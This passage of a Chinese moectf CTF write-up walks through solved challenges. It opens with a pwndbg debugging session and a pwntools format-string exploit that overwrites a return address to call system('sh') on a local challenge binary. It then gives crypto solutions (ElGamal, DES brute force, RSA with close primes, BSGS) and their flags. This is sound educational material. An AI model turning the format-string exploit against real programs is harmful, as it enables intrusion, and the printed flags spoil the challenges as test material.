Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 215 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from pwn...
(No debugging symbols found in pwn)
------- tip of the day (disable with set show-tips off) -------
Use contextprev and contextnext to display a previous context output again without scrolling
pwndbg> b *0x401332
Breakpoint 1 at 0x401332
pwndbg> r
Starting program: /home/kali/Desktop/ctf/fmt_s/pwn 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
You're walking down the road when a monster appear.
You start talking to him...
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p

Breakpoint 1, 0x0000000000401332 in talk ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
 RAX  0
 RBX  0x7fffffffddc8 —▸ 0x7fffffffe159 ◂— '/home/kali/Desktop/ctf/fmt_s/pwn'
 RCX  0x402088 ◂— "You're walking down the road when a monster appear."
 RDX  0x1e
 RDI  0x4040c0 (fmt) ◂— '%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\n'
 RSI  0x4040c0 (fmt) ◂— '%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\n'
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffddd8 —▸ 0x7fffffffe17a ◂— 'COLORFGBG=15;0'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64                                                                                                    
 RBP  0x7fffffffdc90 —▸ 0x7fffffffdcb0 ◂— 1
 RSP  0x7fffffffdc80 ◂— 0
 RIP  0x401332 (talk+82) ◂— call printf@plt
────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────
 ► 0x401332 <talk+82>     call   printf@plt                  <printf@plt>
        format: 0x4040c0 (fmt) ◂— '%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\n'
        rsi: 0x4040c0 (fmt) ◂— '%p|%p|%p|%p|%p|%p|%p|%p|%p|%p\n'
        rdx: 0x1e
        rcx: 0x402088 ◂— "You're walking down the road when a monster appear."
        r8: 0
        r9: 0
        arg[6]: 0
        arg[7]: 0x7fffffffddd8 —▸ 0x7fffffffe17a ◂— 'COLORFGBG=15;0'
        arg[8]: 0x7fffffffdcb0 ◂— 1
        arg[9]: 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1
        arg[10]: 0
 
   0x401337 <talk+87>     lea    rax, [rip + 0xd15]     RAX => 0x402053 ◂— 0x756f59000000003f /* '?' */
   0x40133e <talk+94>     mov    rdi, rax               RDI => 0x402053 ◂— 0x756f59000000003f /* '?' */
   0x401341 <talk+97>     call   puts@plt                    <puts@plt>
 
   0x401346 <talk+102>    lea    rax, [rip + 0xd0b]     RAX => 0x402058 ◂— 'You enraged the monster-prepare for battle!'
   0x40134d <talk+109>    mov    rdi, rax               RDI => 0x402058 ◂— 'You enraged the monster-prepare for battle!'
   0x401350 <talk+112>    call   puts@plt                    <puts@plt>
 
   0x401355 <talk+117>    mov    esi, 8                  ESI => 8
   0x40135a <talk+122>    lea    rax, [rip + 0x2d3f]     RAX => 0x4040a0 (atk)
   0x401361 <talk+129>    mov    rdi, rax                RDI => 0x4040a0 (atk)
   0x401364 <talk+132>    call   my_read                     <my_read>
──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc80 ◂— 0
01:0008│-008 0x7fffffffdc88 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe17a ◂— 'COLORFGBG=15;0'
02:0010│ rbp 0x7fffffffdc90 —▸ 0x7fffffffdcb0 ◂— 1
03:0018│+008 0x7fffffffdc98 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1
04:0020│+010 0x7fffffffdca0 ◂— 0
05:0028│+018 0x7fffffffdca8 ◂— 0x1ffffdd40
06:0030│+020 0x7fffffffdcb0 ◂— 1
07:0038│+028 0x7fffffffdcb8 —▸ 0x7ffff7dd2ca8 (__libc_start_call_main+120) ◂— mov edi, eax
────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► 0         0x401332 talk+82
   1         0x4013b1 main+66
   2   0x7ffff7dd2ca8 __libc_start_call_main+120
   3   0x7ffff7dd2d65 __libc_start_main+133
   4         0x401135 _start+37
─────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
0x4040c0|0x1e|0x402088|(nil)|(nil)|(nil)|0x7fffffffddd8|0x7fffffffdcb0|0x4013b1|(nil)
0x0000000000401337 in talk ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
*RAX  0x56
 RBX  0x7fffffffddc8 —▸ 0x7fffffffe159 ◂— '/home/kali/Desktop/ctf/fmt_s/pwn'
*RCX  0
*RDX  0
*RDI  0x7fffffffdaa0 —▸ 0x7fffffffdad0 ◂— '0x4040c0|0x1e|0x402088|(nil)|(nil)|(nil)|0x7fffffffddd8|0x7fffffffdcb0|0x4013b1|(nil)\n'
*RSI  0x7fffffffdad0 ◂— '0x4040c0|0x1e|0x402088|(nil)|(nil)|(nil)|0x7fffffffddd8|0x7fffffffdcb0|0x4013b1|(nil)\n'
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  0
 R13  0x7fffffffddd8 —▸ 0x7fffffffe17a ◂— 'COLORFGBG=15;0'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64                                                                                                    
 RBP  0x7fffffffdc90 —▸ 0x7fffffffdcb0 ◂— 1
 RSP  0x7fffffffdc80 ◂— 0
*RIP  0x401337 (talk+87) ◂— lea rax, [rip + 0xd15]
────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────
b+ 0x401332 <talk+82>     call   printf@plt                  <printf@plt>
 
 ► 0x401337 <talk+87>     lea    rax, [rip + 0xd15]     RAX => 0x402053 ◂— 0x756f59000000003f /* '?' */
   0x40133e <talk+94>     mov    rdi, rax               RDI => 0x402053 ◂— 0x756f59000000003f /* '?' */
   0x401341 <talk+97>     call   puts@plt                    <puts@plt>
 
   0x401346 <talk+102>    lea    rax, [rip + 0xd0b]     RAX => 0x402058 ◂— 'You enraged the monster-prepare for battle!'
   0x40134d <talk+109>    mov    rdi, rax               RDI => 0x402058 ◂— 'You enraged the monster-prepare for battle!'
   0x401350 <talk+112>    call   puts@plt                    <puts@plt>
 
   0x401355 <talk+117>    mov    esi, 8                  ESI => 8
   0x40135a <talk+122>    lea    rax, [rip + 0x2d3f]     RAX => 0x4040a0 (atk)
   0x401361 <talk+129>    mov    rdi, rax                RDI => 0x4040a0 (atk)
   0x401364 <talk+132>    call   my_read                     <my_read>
──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdcb0 ◂— 0
01:0008│-008 0x7fffffffdcb8 —▸ 0x7fffffffde08 —▸ 0x7fffffffe193 ◂— 'COLORFGBG=15;0'
02:0010│ rbp 0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 1
03:0018│+008 0x7fffffffdcc8 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1
04:0020│+010 0x7fffffffdcd0 ◂— 0
05:0028│+018 0x7fffffffdcd8 ◂— 0x1ffffdd70
06:0030│+020 0x7fffffffdce0 ◂— 1
07:0038│+028 0x7fffffffdce8 —▸ 0x7ffff7dd2ca8 (__libc_start_call_main+120) ◂— mov edi, eax
────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► 0         0x401337 talk+87
   1         0x4013b1 main+66
   2   0x7ffff7dd2ca8 __libc_start_call_main+120
   3   0x7ffff7dd2d65 __libc_start_main+133
   4         0x401135 _start+37
─────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

我们把程序跑起来了，看到第八个地址是`0x4013b1`(从`0`开始)

然后看看它的流程

```shell
pwndbg> bt
#0  0x0000000000401337 in talk ()
#1  0x00000000004013b1 in main ()
#2  0x00007ffff7dd2ca8 in __libc_start_call_main (main=main@entry=0x40136f <main>, 
    argc=argc@entry=1, argv=argv@entry=0x7fffffffddc8) at ../sysdeps/nptl/libc_start_call_main.h:58
#3  0x00007ffff7dd2d65 in __libc_start_main_impl (main=0x40136f <main>, argc=1, 
    argv=0x7fffffffddc8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffddb8) at ../csu/libc-start.c:360
#4  0x0000000000401135 in _start ()
pwndbg> x/20gx $rsp
0x7fffffffdc80: 0x0000000000000000      0x00007fffffffddd8
0x7fffffffdc90: 0x00007fffffffdcb0      0x00000000004013b1
0x7fffffffdca0: 0x0000000000000000      0x00000001ffffdd40
0x7fffffffdcb0: 0x0000000000000001      0x00007ffff7dd2ca8
0x7fffffffdcc0: 0x00007fffffffddb0      0x000000000040136f
0x7fffffffdcd0: 0x0000000100400040      0x00007fffffffddc8
0x7fffffffdce0: 0x00007fffffffddc8      0x0cf2c15381546f57
0x7fffffffdcf0: 0x0000000000000000      0x00007fffffffddd8
0x7fffffffdd00: 0x00007ffff7ffd000      0x0000000000403e00
0x7fffffffdd10: 0xf30d3eac38d66f57      0xf30d2ee9d9966f57
```

重点看`#1  0x00000000004013b1 in main ()`和`0x7fffffffdc90: 0x00007fffffffdcb0      0x00000000004013b1`

重新开一下栈

```shell
pwndbg> stack
00:0000│ rsp 0x7fffffffdcb0 ◂— 0
01:0008│-008 0x7fffffffdcb8 —▸ 0x7fffffffde08 —▸ 0x7fffffffe193 ◂— 'COLORFGBG=15;0'
02:0010│ rbp 0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 1
03:0018│+008 0x7fffffffdcc8 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1
04:0020│+010 0x7fffffffdcd0 ◂— 0
05:0028│+018 0x7fffffffdcd8 ◂— 0x1ffffdd70
06:0030│+020 0x7fffffffdce0 ◂— 1
07:0038│+028 0x7fffffffdce8 —▸ 0x7ffff7dd2ca8 (__libc_start_call_main+120) ◂— mov edi, eax
```

这里得到`返回地址0x7fffffffdcc8`和`泄露地址7fffffffdcb0`

计算一下`栈地址 = 0x7fffffffdcc8 - 7fffffffdcb0 = 0x18`

然后我们往脚本里加入栈地址和覆盖`flag`试试

**继续编写测试脚本**

```python
from pwn import *

r = remote("127.0.0.1", 3834)

system_addr = 0x40127b

r.sendafter(b"You start talking to him...", b"%8$p")
r.recvuntil(b"0x")
command_addr = int(b"0x"+r.recv(12), 16)
stack_addr = command_addr - 0x18

r.sendafter(b"You enraged the monster-prepare for battle!", b'\x00'*8)

print(stack_addr)

r.interactive()
```

**运行测试脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 3834
[x] Opening connection to 127.0.0.1 on port 3834: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 3834: Done
140728261406392
[*] Switching to interactive mode

You start talking to him...
```

没有问题

因为我们每次循环都会让栈结构发生改变，所有我们要重新用`gdb`来获取栈布局，得到`12`和`32`

**编写恶意脚本**

```python
from pwn import *

r = remote("127.0.0.1", 3834)

system_addr = 0x40127b

r.sendafter(b"You start talking to him...", b"%8$p")
r.recvuntil(b"0x")
command_addr = int(b"0x"+r.recv(12), 16)
stack_addr = command_addr - 0x18
r.sendafter(b"You enraged the monster-prepare for battle!", b'\x00'*8)

payload = "%{}c%12$hn".format(stack_addr&0xffff).encode()
r.sendafter(b"You start talking to him...", payload)
r.sendafter(b"You enraged the monster-prepare for battle!", b'\x00'*8)

payload = "%{}c%32$hn".format(system_addr&0xffff).encode()
r.sendafter(b"You start talking to him...", payload)
r.sendafter(b"You enraged the monster-prepare for battle!", b"sh\x00")

r.interactive()
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
$ ls
/flag

$ cat flag
moectf{}

进程已结束，退出代码为 0
```

**得到：moectf{}**



## 密码学

### Crypto入门指北

#### 解题过程

**下载双击打开查看题目**

```python
from Crypto.PublicKey import ElGamal
from Crypto.Random import get_random_bytes, random
from Crypto.Util.number import *
from random import *
from secret import flag
def generate_elgamal_keypair(bits=512):
    p = getPrime(bits)
    for _ in range(1000):
        g = getRandomRange(2, 5)
        if pow(g, (p - 1) // 2, p) != 1:
            break
    x = randrange(2, p - 1)
    y = pow(g, x, p)
    return p, g, y, x
key=generate_elgamal_keypair(bits=512)
p, g, y ,x= key
print("=== 公钥 (p, g, y) ===")
print("p =", p)
print("g =", g)
print("y =", y)
print()
k = randrange(1, p - 2)
m = bytes_to_long(flag)
c1 = pow(g, k, p)
c2 = (m * pow(y, k, p)) % p
print("=== 密文 (c1, c2) ===")
print("c1 =", c1)
print("c2 =", c2)
#不小心把x输出了()
print("x =", x)
"""
=== 公钥 (p, g, y) ===
p = 11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863
g = 2
y = 8313424783366011287014623582773521595333285291380540689467073212212931648415580065207081449784135835711205324186662482526357834042013400765421925274271853
=== 密文 (c1, c2) ===
c1 = 6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863
c2 = 2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983
x = 8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214
"""
```

**分析：**

- 首先看到`c2 = (m * pow(y, k, p)) % p`我们简化成`c2 = (m * s) % p其中s = pow(y, k, p)`

- 然后我们可以通过`s`的逆元`inv_s`进而求出`m`

  逆元是取模的逆运算，`c2 = (m * s) -> m = (c2 ÷ s)`在取模运算中是不存在的但是我们可以改`除为乘`再`改元为逆元`来代替比如这样`c2 = (m * s) % p -> m = (c2 * inv_s) % p`

- 那么`inv_s`怎么求呢，这个公式是`inv_s = pow (s,-1,p)`

- 这样以后`m = pow(c2,inv_s,p)`

- 然后我们可以用`long_to_bytes(m).decode()`来求出flag

**编写计算脚本**

```python
from Crypto.Util.number import long_to_bytes

s = pow(y, k, p)
inv_s = pow (s,-1,p)
m = (c2 * inv_s) % p

print(long_to_bytes(m).decode())
```

发现`k`是未知的

我们这时候需要用其他已知量来替换掉`k`了

注意到`s = pow(y, k, p)`和`y = pow(g, x, p)`而且`c1 = pow(g, k, p)`所以`s = pow(y, k, p) = pow(g, x*k, p) = pow(c1, x, p)其中c1 = pow(g, k, p)`得到`s = pow(c1, x, p)`

**继续编写计算脚本**

```python
p = 11540963715962144951763578255357417528966715904849014985547597657698304891044841099894993117258279094910424033273299863589407477091830213468539451196239863
y = 8313424783366011287014623582773521595333285291380540689467073212212931648415580065207081449784135835711205324186662482526357834042013400765421925274271853

c1 = 6652053553055645358275362259554856525976931841318251152940464543175108560132949610916012490837970851191204144757409335011811874896056430105292534244732863
c2 = 2314913568081526428247981719100952331444938852399031826635475971947484663418362533363591441216570597417789120470703548843342170567039399830377459228297983
x = 8010957078086554284020959664124784479610913596560035011951143269559761229114027738791440961864150225798049120582540951874956255115884539333966429021004214

from Crypto.Util.number import long_to_bytes

s = pow(c1,x,p)
inv_s = pow (s,-1,p)
m = (c2 * inv_s) % p

print(long_to_bytes(m).decode())
```

**运行计算脚本**

```python
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
moectf{th1s_1s_y0ur_f1rst_ElG@m@l}
```

**得到：moectf{th1s_1s_y0ur_f1rst_ElG@m@l}**



### **ez_DES**

#### 解题过程

**下载双击打开查看源码**

```python
from Crypto.Cipher import DES
import secrets
import string

flag = 'moectf{???}'
characters = string.ascii_letters + string.digits + string.punctuation
key = 'ezdes'+''.join(secrets.choice(characters) for _ in range(3))
assert key[:5] == 'ezdes'
key = key.encode('utf-8')
l = 8

def encrypt(text, key):
    cipher = DES.new(key, DES.MODE_ECB)
    padded_text = text + (l - len(text) % l) * chr(len(text))
    data = cipher.encrypt(padded_text.encode('utf-8'))
    return data

c = encrypt(flag, key)
print('c =', c)

# c = b'\xe6\x8b0\xc8m\t?\x1d\xf6\x99sA>\xce \rN\x83z\xa0\xdc{\xbc\xb8X\xb2\xe2q\xa4"\xfc\x07'
```

**分析：**

- `characters = string.ascii_letters + string.digits + string.punctuation`等价于`chr(x),x∈[33,126]`
- `secrets.choice(characters) for _ in range(3)`是从中随机选3个字符，**可重复**
- `padded_text = text + (l - len(text) % l) * chr(len(text))`这句其实在这题并不重要，因为它其实是在`flag`后追加内容让它符合`DES-ECB`对称加密分组的规范而已

**解题思路：**

- 这题我只需知道`key`就可以`decrypt`出`m`
- 而`key`只有三个可变字符，可爆破
- 我们爆破key，从而爆破`m`，判断前缀`moectf{`即可

**编写解密脚本：**

```python
from Crypto.Cipher import DES

c = b'\xe6\x8b0\xc8m\t?\x1d\xf6\x99sA>\xce \rN\x83z\xa0\xdc{\xbc\xb8X\xb2\xe2q\xa4"\xfc\x07'

while True:
    for a1 in range(33, 127):
        for a2 in range(33, 127):
            for a3 in range(33, 127):
                key = ("ezdes" + chr(a1) + chr(a2) + chr(a3)).encode("utf-8")
                cipher = DES.new(key, DES.MODE_ECB)
                try:
                    m = cipher.decrypt(c).decode("utf-8")
                    if m.startswith("moectf{"):
                        print("flag:", m)
                except UnicodeDecodeError:
                    continue
```

**运行解密脚本：**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
flag: moectf{_Ju5t envmEra+e.!}
flag: moectf{_Ju5t envmEra+e.!}
flag: moectf{_Ju5t envmEra+e.!}
```

**得到：moectf{_Ju5t envmEra+e.!}**



### **baby_next**

#### 解题过程

**下载双击查看题目**

```python
from Crypto.Util.number import *
from gmpy2 import next_prime
from functools import reduce
from secret import flag

assert len(flag) == 38
assert flag[:7] == b'moectf{'
assert flag[-1:] == b'}'

def main():
    p = getPrime(512)
    q = int(reduce(lambda res, _: next_prime(res), range(114514), p))

    n = p * q
    e = 65537

    m = bytes_to_long(flag)

    c = pow(m, e, n)
	
    print(f'{n = }')
    print(f'{c = }')

if __name__ == '__main__':
    main()

"""
n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397
c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967
"""
```

**分析：**

- 这道题的重点在于分解n得到p和q
- `q = int(reduce(lambda res, _: next_prime(res), range(114514), p))`这句话告诉我们`q`是在`p`后`114514`个素数
- 由于`p`和`q`的间隔不大，我们可以用`p < √n < q`的不等关系遍历得到`q`从而得到`p`

**编写尝试脚本**

```python
from gmpy2 import next_prime, iroot

n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397

sqrt_n = iroot(n, 2)[0]
q = next_prime(sqrt_n)

while True:
    if n % q == 0:
        p = n // q
        print("p",p)
        print("q",q)
        break
    q = next_prime(q)
```

**运行测试脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
p 9835790642950870702456388102541833011851580184211232019829465812360043670916676289614924432072209183922656300400121695605187082642402117584019839297179867
q 9835790642950870702456388102541833011851580184211232019829465812360043670916676289614924432072209183922656300400121695605187082642402117584019839337925591

进程已结束，退出代码为 0
```

发现可行

**继续编写解密脚本**

```python
from Crypto.Util.number import *
from gmpy2 import next_prime, iroot

n = 96742777571959902478849172116992100058097986518388851527052638944778038830381328778848540098201307724752598903628039482354215330671373992156290837979842156381411957754907190292238010742130674404082688791216045656050228686469536688900043735264177699512562466087275808541376525564145453954694429605944189276397
c = 17445962474813629559693587749061112782648120738023354591681532173123918523200368390246892643206880043853188835375836941118739796280111891950421612990713883817902247767311707918305107969264361136058458670735307702064189010952773013588328843994478490621886896074511809007736368751211179727573924125553940385967
e = 65537

sqrt_n = iroot(n, 2)[0]
q = next_prime(sqrt_n)

while True:
    if n % q == 0:
        p = n // q
        phi_n = (p - 1) * (q - 1)
        d = inverse(e, phi_n)
        m = pow(c, d, n)
        flag = long_to_bytes(m).decode()
        if flag.startswith("moectf{") and flag.endswith("}"):
            print(flag)
            break
    q = next_prime(q)
```

**运行解密脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
moectf{vv0W_p_m1nu5_q_i5_r34l1y_sm4lI}

进程已结束，退出代码为 0
```

**得到：moectf{vv0W_p_m1nu5_q_i5_r34l1y_sm4lI}**



### ez_BSGS

#### 解题过程

**查看题目**

> (13 ** flag) ≡ 114514 (mod 100000000000099) 其中flag为最小整数

**分析：**

- `≡`是同余符号，`a ≡ b (mod m) 等价于 (a - b) % m == 0`

- 这是BSGS大步小步算法

**编写计算脚本**

```python
import math
from math import gcd

def BSGS(a: int, b: int, m: int) -> int | None:
    m = abs(m)
    b = b % m
    a = a % m

    if m == 1:
        return 1
    if b == 1:
        return 0
    if a == 0:
        return 1 if b == 0 else None

    d = 0
    g = gcd(a, m)
    while g != 1:
        if b % g != 0:
            return None
        d += 1
        m = m // g
        b = b // g
        a = a // g
        g = gcd(a, m)
        if b == 1:
            return d

    t = math.ceil(math.sqrt(m))
    hash_map = dict()
    aj = 1
    for j in range(t):
        val = (b * aj) % m
        if val not in hash_map:
            hash_map[val] = j
        aj = (aj * a) % m

    at = pow(a, t, m)
    ati = 1
    for i in range(1, t + 1):
        ati = (ati * at) % m
        if ati in hash_map:
            x_prime = i * t - hash_map[ati]
            x = x_prime + d
            if pow(a, x, m * (10 ** d)) == b % (m * (10 ** d)):
                return x
    return None

flag = BSGS(13, 114514, 100000000000099)
print(f"moectf{{{flag}}}")
```

**运行解密脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
moectf{18272162371285}

进程已结束，退出代码为 0
```

**得到：moectf{18272162371285}**



## Web安全与渗透测试

### 神秘的手镯

#### 解题过程

**下载打开查看密钥**

```
VkUpRXYLbkpqYZQtZBOpaIRmsCblcVolXCdboFKykeoYXYmUlPvYVHJsrmazlczaEhgawumAGvRVzXJsyeOzTUBZCFQNcEHRtodwVrkvltIBhBMwItNwOdxdoeLOCswoVnoPDtQyEVqtGraZmAZcZVKVcLajaLoeZAZWDQSFaXeOLTljHfbstUNvDoxpJntJpojvDGAgUKoZaZmrfHIlqbfYZFnFNEgWtKsaBAMgcaiFoClqDjLHnCjQctfVATlMSOeblHJKHCPksZPUPlGHKNTKcnVOHwDMhoJdzAWZvxBzHZKQpLnQtadeDGrtGtlUcyjZqfqbeFrJrhUdICidoHQTaUfNjkJITRDHlVexMipLWiKeCVwemxBnxtkekCLposFnZsrJhytpjmsCrCVkQoCZjzRFAzNVTjEdqKfsfwUEhuTjwVyZAwCfohcRnbiNUqyVZfYSlIuBetGQUOGtbPlcJeHKbFjBTOtGLqsIUfCUXLmcwKDWTQROmwxisWxDzmNWgOCAJOwgYOiqVcwmYFcFqTvTdeQgxZVwpoKQHonXlvYPUWSuXeqjWcuzyHVJaGZqnGcHItLkXvlRteaGhtmwzJlQoTGOvNCrVGsnJpwsZHfwaMjdrbovsvjakagfymNJTfuYVHyLHrvjGVFQoQgJmpUsvTISvSTNAwZFRICjqjLAYAuWMESCLRYGleXmgsbmSOkPHKQhqZaoHLZNfPkBMWSVBLCNDMHYhOkDYiLsmdxLKqpXMQunWpKJvPjeNUkIlYkCFMLTJxehkcxWzImkZgkhFSMJvYEwLsGbfkNxOpwajTnrTpUgMvdeypHMhPNLOrLHDocGsofvgmQBeBxhakuoIhqgSmprQpcWRBoFiKHWKMqCnpLrTOgVhfNGQKYRSqaXixUYTKrqubfhuzitHlkYWMuQwMqLXhYbVWXSMUwEtHFVtaJpvCBteAZiJDlnZXSLnlaHmFjOwvUyLHRSkJzvNkXTGzUStkruMuxCycVTeayVYBkgegPemVNTOsemdXTSOBlcPhRBrDxshupHSBVMdfgdmXpNpFDSXRXYzjTDAOTDCPIvtrPvxjuxLHNtQmqZgiavTalaQaCQbSpReyHDcwrPyukGRPkoDEMiMjvSZWtNEVFISiwMoUFsvMoYEAOlrYCJlwtCBdXwbcVtdcnjQDTbSosBHqpQcKWRMhsEtxWfCDWSPoSIlYzvgWicWVsEjYKJQDGmKDXPqEApHVoQwKZLQBdbvFLsIRqATVAbhfxmwItjrWUlahlsdTMdBWUTUxtzNRdCuxairuHpJLzQdFYtnGfvMHNEOIhYpDJYbAPjpYIXbfdaVhZRYhsERcPzXSFRkbNZafmZsJleiLnTxyXjxwhSUmicufTuBeQRzIPSkRTsDufmBsbNlOvnCjWxYBmxSqZKMjhfyFIlJAyWapjMhbkGyoJPasdRDiuMdREUEdWfhbXpCduhcoqSrvJAUWtaluotyJAckibvqfUvCpvZivygCTkjdjWTozEOaVpXctRXgjTOdhQwxVMZxLGvKsxWQPqZUEYgBXEjwBTcTyfRzjnMaJhdhxBwSNdawoKAlxCiPBPuQvcwMhoIaVXExhvHyEJZPVJpXRoTdZIKgnIQsdfQdivGnowtCpTXafWSJTqmhXvYJCBrHPkndgvTUsUozkxOChMjbNDsvaVYPgMpzTRSUxiRjImAQpgrBstkBDfEgZMvuThQPaJoNvKGByJrlAfiRkAOhiViYdPdNkWjMBcUJoIeCPDYTQGqtUiRqRZQPxSUbtBPLOyqGjhVfORbmBdowGLvGaVLgdIZCdymSUKXnCmpjaCujpxRfKSoEzNzjIEyrLNBgOUsHnmRicnaybJPDyEDPLmyrLaxKZKEokoRdNLqiAGYpDXzFjFyXibscfYIzxvhYtcUesazdQhQMqxgaBKCOCQOVcbsDYgjMTnkxzAjNmfaRYxURiLkxwXzMrFBrvmBSvRvRXVoNsDgBdjYBLrZhdZBrEFPHuKIgRSAQAKZwpcflwIMhlSBkzCSRvMIGVyfHGiGXSnkefymDvulXoQvRXsHZHeQAxSHeyqTSfXCtDHTlqHEAUvySNUqbVxKWQGRZUPxSNjsouFBRidZJGVweIlGrmpaoFwJiAVevozIkJvwLOSQuZDRSXewlpniqGLJlQZardiCizCTKbjTEBhNdwUxFZlulBUsaeXuOewgZhwpmkGjEovefuXrUnYGBjXKpogNSeVhflayIVTUFHvnZqoiZokvlgsWrqgASAJrDaligOtSLZgykRheljBMlzhwrOaEmnJMjKpRHngmvHZyhMaVsfDTLDRQYlsHjLsicuduqhLkQLhVLCXkfQEVFWkPhRXagtGQeVgIjyDhpzYjewIEbJbSuFEShFtaQyLowBaeNdUrjwOEMnFpodofAqrbxrmogmDXqZmFqrTonKAWcGDmIXcynGISwXYKMPtyJzBvbyFOJqSVrmSVfTAJCKJZeucHzbgwOiqHYldqWOZoKXCwHomHfXsyOKVyUAWTjVYvzmsIherMOqzUFwfJFWbLTsWCzoEdKLhLconQGcIueFrcDXgQHSYLpDoHmctrFDvxmgeiAxQxDLPeJzOpvxeXDhulfeXqWIqZlGsTyJSpeykBXsNUgtglFaITJDrkUVkXnJXMFhJNQfKxbHnswGmKAMNeUnERwBHBqfTPUYDZUpOlsEcNVJMHJkcJwTuBlDyfQJNfvJtRcitbmToqjGsjnuWokyAfARhAoIrtCvjFeLqueXyCysyPOlJnTlEoDRNWsTZfCvNzcAKfQljTDmZDHpLtfHfNhEDLPmuvXMfqMjNkgehcMcQAMGuMPyrNdreNATYNGluOzCvbPFWGVSCvNfgVyIsRTscTjanlytQKNlitNHfpYHqrgoDwxTlCuMtgkcKWdXCwUXvOhVjgCJtFpstyjmCapnjNaYDUdaqLZiMcuiaiGvNQBNGBlzAcDaODTXoEjmgeSYTvUPzSvrFdpJRsxQBVuLgOSTLwdlTJTrGRApuyBuSOXfiTbxzxLponpdrQYOPazDYHGseOqUnXyOiGktdyENGowuczQsEpWhAoMuOzUrLtlTGAofZEhduAekEUWKgoHXoKjSUhkVrhyrVDOgnRLJNqOJZeXbzhtPrYxpHlNZeQYgwqwqjTahQSXQgMaEOXvjcqPXWdxMfoEFufWUcYUcloRupDIFUEbUFAsWyAzQJXRoFWpymhCxWyDJIjbNbdHNMhjzcVsaZbGJknpskxGmQeJoDyzAhEcIcgcoiQUiWAcnuHRLEiZQrfcBcirlNAYDYAoGWnkJiJHDYexWXgwPsWhwKgitgLQGoUlcKdbesvNyxpAksIMTItnanPOkAMPLXKTaUsHPbzxcOjzkbiBLnRlCMfRXEhlsAdNtYgeKPnKPMqcxOWzuwmwCihIaliGLtHOkHAUalvGPhOhFCGCtSyixHTzYqKCjlXkogovFKLTGsOsGxGLctFoIuDlmwaioIlZscDApwScysQdGrTbtPNVClnOBCdaznmHNcdInDWeREdnbuAxmYiAvtUJeAoNgcZdGNlPfoMLEzJNSaQJWclYEuAUxTNfsRwldaleLfZeQfVqrTYBMGHvoLnITJyhiPeOygEOyFkZQHIEkvJPIKUnuGyCpaCQcWYEgbmyDtecdRuKDOXqpTSdprlpnvPMnWfHpCsPfAnLRTEBlMXstwga